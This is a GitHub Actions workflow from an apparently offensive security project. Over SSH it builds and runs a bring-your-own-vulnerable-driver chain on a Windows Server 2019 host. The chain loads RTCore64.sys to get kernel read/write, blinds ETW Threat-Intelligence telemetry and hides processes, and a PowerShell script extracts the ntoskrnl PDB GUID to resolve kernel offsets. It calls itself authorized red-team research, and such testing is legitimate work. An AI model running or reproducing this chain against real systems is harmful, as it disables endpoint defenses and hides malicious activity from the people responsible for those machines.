name: Win BYOVD (17763 real kernel)

# The kernel-tier gate. Runs the BYOVD → ETW-TI blind → process hide chain
# on the authorized physical Win Server 2019 (build 17763, HVCI OFF,
# SeLoadDriverPrivilege). GitHub's own Windows runners forbid driver loading
# AND run with HVCI on, so this chain can ONLY execute on this host.
#
# State model: the ubuntu runner is the source of truth — it cross-compiles
# on free linux minutes, ships binaries + a self-contained PowerShell test
# script to the server, runs them in a fresh run-scoped dir, then cleans up.
# The server holds NO persistent checkout; state never drifts.
#
# Secrets (configured via gh): WIN_HOST, WIN_USER, WIN_SSH_KEY, WIN_KNOWN_HOSTS
#
# Authorized red-team security research.

on:
  workflow_dispatch: {}
  push:
    branches: [main]
    paths:
      - '.github/workflows/windows-byovd.yml'
      - 'crates/operator-kernelsdk/**'
      - 'crates/operator-kernel-cli/**'

concurrency:
  group: win-byovd
  cancel-in-progress: true

jobs:
  byovd:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4

      - name: Setup SSH tunnel
        env:
          WIN_SSH_KEY: ${{ secrets.WIN_SSH_KEY }}
          WIN_HOST: ${{ secrets.WIN_HOST }}
          WIN_USER: ${{ secrets.WIN_USER }}
          WIN_KNOWN_HOSTS: ${{ secrets.WIN_KNOWN_HOSTS }}
        run: |
          mkdir -p ~/.ssh
          printf '%s\n' "$WIN_SSH_KEY" > ~/.ssh/win_key
          chmod 600 ~/.ssh/win_key
          printf '%s\n' "$WIN_KNOWN_HOSTS" >> ~/.ssh/known_hosts
          cat >> ~/.ssh/config <<EOF
          Host win
            HostName $WIN_HOST
            User $WIN_USER
            IdentityFile ~/.ssh/win_key
            IdentitiesOnly yes
            ConnectTimeout 20
            ServerAliveInterval 30
          EOF
          ssh win 'echo TUNNEL_OK' || { echo "::error::SSH tunnel failed"; exit 1; }

      - name: Build + test on the physical host (local MSVC, no cross-compile)
        run: |
          # The host has git + cargo nightly + MSVC already. We git-fetch the
          # exact commit being tested into a fresh worktree (not the C:\nyx
          # checkout — that's the host's own scratch copy, not ours to mutate),
          # build with MSVC, and run the kernel chain. All state is scoped to
          # the run dir and cleaned at the end.
          RUN_DIR="C:/Users/Administrator/nyx_run_${{ github.run_id }}"
          SHA="${{ github.sha }}"
          echo "RUN_DIR=$RUN_DIR" >> $GITHUB_ENV
          ssh win "powershell -NoProfile -ExecutionPolicy Bypass -Command \"
            \$ErrorActionPreference='Stop';
            \$run='$RUN_DIR';
            \$sha='$SHA';
            New-Item -ItemType Directory -Force -Path \\\$run | Out-Null;

            # Clone the repo at the tested SHA (shallow + exact rev — fast).
            git clone --depth 1 --no-checkout https://github.com/qiaozhiyi/NY \\\$run\\src 2>&1 | Select-Object -Last 2;
            Push-Location \\\$run\\src;
            git checkout \\\$sha 2>&1 | Select-Object -Last 2;

            # Build with MSVC (the host's default toolchain). operator-kernel-cli
            # + offset-resolver. Full output — never pipe to Select-Object, so
            # compile errors are visible in the log.
            Write-Output '=== build operator-kernel-cli ===';
            cargo build --release --manifest-path crates/operator-kernel-cli/Cargo.toml 2>&1;
            Write-Output '=== build offset-resolver ===';
            cargo build --manifest-path crates/offset-resolver/Cargo.toml 2>&1;

            Copy-Item crates/operator-kernel-cli/target/release/nyx-kernel.exe \\\$run\\;
            Copy-Item crates/offset-resolver/target/debug/nyx-offset-resolver.exe \\\$run\\;
            Pop-Location;
            Write-Output BUILD_DONE
          \"" 2>&1 | tee build.log
          # If the build failed, abort before the destructive kernel test.
          grep -q "BUILD_DONE" build.log || { echo "::error::build failed on host"; exit 1; }

      - name: Run kernel test (PDB resolve + BYOVD chain)
        continue-on-error: true
        run: |
          # The test script is written locally (clean heredoc, no SSH escaping)
          # and scp'd to the host, then invoked via powershell -File.
          cat > run_byovd.ps1 <<'PSEOF'
          param([string]$RunDir)
          $ErrorActionPreference = 'Continue'
          $exe      = "$RunDir\nyx-kernel.exe"
          $resolver = "$RunDir\nyx-offset-resolver.exe"
          $sys      = "C:\Users\Administrator\RTCore64.sys"

          # --- 1. Live PDB offset resolution (build 17763.1339) ---
          # $script: scoping so Resolve-FileOffset can see the byte array +
          # section table (PowerShell functions don't inherit caller locals).
          Write-Output "=== PDB resolve (17763) ==="
          $script:bytes = [IO.File]::ReadAllBytes("C:\Windows\System32\ntoskrnl.exe")
          $script:pe = [BitConverter]::ToInt32($script:bytes, 0x3C)
          $script:numSec = [BitConverter]::ToUInt16($script:bytes, $script:pe + 6)
          $script:optSz = [BitConverter]::ToUInt16($script:bytes, $script:pe + 20)
          $script:secStart = $script:pe + 24 + $script:optSz
          function Resolve-FileOffset($rva) {
            for ($i=0; $i -lt $script:numSec; $i++) {
              $s = $script:secStart + $i*40
              $va = [BitConverter]::ToInt32($script:bytes, $s+12)
              $vs = [BitConverter]::ToInt32($script:bytes, $s+8)
              $pr = [BitConverter]::ToInt32($script:bytes, $s+20)
              if ($rva -ge $va -and $rva -lt ($va+$vs)) { return $pr + ($rva - $va) }
            }
            return $rva
          }
          $ddVA = [BitConverter]::ToInt32($script:bytes, $script:pe + 24 + 0xA0)
          $ddSize = [BitConverter]::ToInt32($script:bytes, $script:pe + 24 + 0xA4)
          $ddOff = Resolve-FileOffset $ddVA
          for ($i=0; $i -lt ($ddSize/28); $i++) {
            $e = $ddOff + $i*28
            if ([BitConverter]::ToInt32($script:bytes, $e+12) -eq 6) {
              $cv = [BitConverter]::ToInt32($script:bytes, $e+24)
              if ($cv -le 0) { $cv = Resolve-FileOffset ([BitConverter]::ToInt32($script:bytes, $e+20)) }
              if ($script:bytes[$cv] -eq 0x52 -and $script:bytes[$cv+1] -eq 0x53 -and $script:bytes[$cv+2] -eq 0x44 -and $script:bytes[$cv+3] -eq 0x53) {
                $g = [Guid]::new($script:bytes, $cv+4)
                $guid = $g.ToString('N').ToUpper()
                $age = [BitConverter]::ToInt32($script:bytes, $cv+20)
                Write-Output "GUID=$guid AGE=$age"
                & $resolver --guid $guid --age $age --out "$RunDir\offsets_17763.toml" 2>&1 | Select-Object -Last 8
                break
              }
            }
          }
          if (Test-Path "$RunDir\offsets_17763.toml") {
            Write-Output "--- offsets_17763.toml ---"
            Get-Content "$RunDir\offsets_17763.toml"
          } else {
            Write-Output "WARN: PDB resolve produced no TOML"
          }

          # --- 2. Kernel chain: BYOVD -> KernelRw -> ETW-TI blind ---
          Write-Output "=== Kernel chain ==="
          if (Test-Path $sys) {
            & $exe bootstrap --byovd $sys RTCore64 2>&1 | Tee-Object "$RunDir\kernel.log"
            Write-Output "KERNEL_EXIT=$LASTEXITCODE"
          } else {
            Write-Output "SKIP: $sys not staged on host"
          }
          PSEOF

          scp run_byovd.ps1 win:"$RUN_DIR/"
          ssh win "powershell -NoProfile -ExecutionPolicy Bypass -File '$RUN_DIR\run_byovd.ps1' -RunDir '$RUN_DIR'" 2>&1 | tee byovd_output.txt

      - name: Collect + cleanup
        if: always()
        run: |
          scp win:"$RUN_DIR/offsets_17763.toml" ./offsets_17763.toml 2>/dev/null || true
          scp win:"$RUN_DIR/kernel.log" ./kernel.log 2>/dev/null || true
          cat byovd_output.txt 2>/dev/null || true
          # Remove the entire run-scoped dir (src clone + binaries + logs).
          ssh win "powershell -NoProfile -Command \"Remove-Item -Recurse -Force '$RUN_DIR' -ErrorAction SilentlyContinue\"" 2>/dev/null || true

      - name: Upload artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: byovd-${{ github.run_id }}
          path: |
            build.log
            byovd_output.txt
            offsets_17763.toml
            kernel.log
          if-no-files-found: ignore
          retention-days: 30
